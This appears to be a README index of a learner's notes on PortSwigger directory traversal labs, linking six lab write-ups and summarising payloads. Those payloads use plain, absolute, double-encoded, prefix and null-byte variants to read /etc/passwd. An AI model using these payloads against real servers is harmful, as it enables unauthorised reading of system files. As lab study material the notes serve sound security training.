# [Directory traversal](https://portswigger.net/web-security/file-path-traversal)

## Labs

- apprentice:
  - [1. File path traversal, simple case](./lab/1.%20File%20path%20traversal%2C%20simple%20case.md)
- practitioner:
  - [2. File path traversal, traversal sequences blocked with absolute path bypass](./lab/2.%20File%20path%20traversal%2C%20traversal%20sequences%20blocked%20with%20absolute%20path%20bypass.md)
  - [3. File path traversal, traversal sequences stripped non-recursively](./lab/3.%20File%20path%20traversal%2C%20traversal%20sequences%20stripped%20non-recursively.md)
  - [4. File path traversal, traversal sequences stripped with superfluous URL-decode](./lab/4.%20File%20path%20traversal%2C%20traversal%20sequences%20stripped%20with%20superfluous%20URL-decode.md)
  - [5. File path traversal, validation of start of path](./lab/5.%20File%20path%20traversal%2C%20validation%20of%20start%20of%20path.md)
  - [6. File path traversal, validation of file extension with null byte bypass](./lab/6.%20File%20path%20traversal%2C%20validation%20of%20file%20extension%20with%20null%20byte%20bypass.md)

## Summary

payloads:

- simple case:

  ```path
  ../../../../../../../../../../../../../etc/passwd
  ```

- absolute path:

  ```path
  /etc/passwd
  ```

- ?:

  ```path
  ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd 
  ```

- double encoding:

  ```path
  %25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66etc/passwd
  ```

- fixed first path:

  ```path
  /var/www/images/../../../../../../../../etc/passwd
  ```

- null byte:

  ```path
  ../../../../../../../../../../../../../../../../../../../etc/passwd%00.png
  ```

burpsuite scanner can detected all the cases above except the `fixed first path` one.
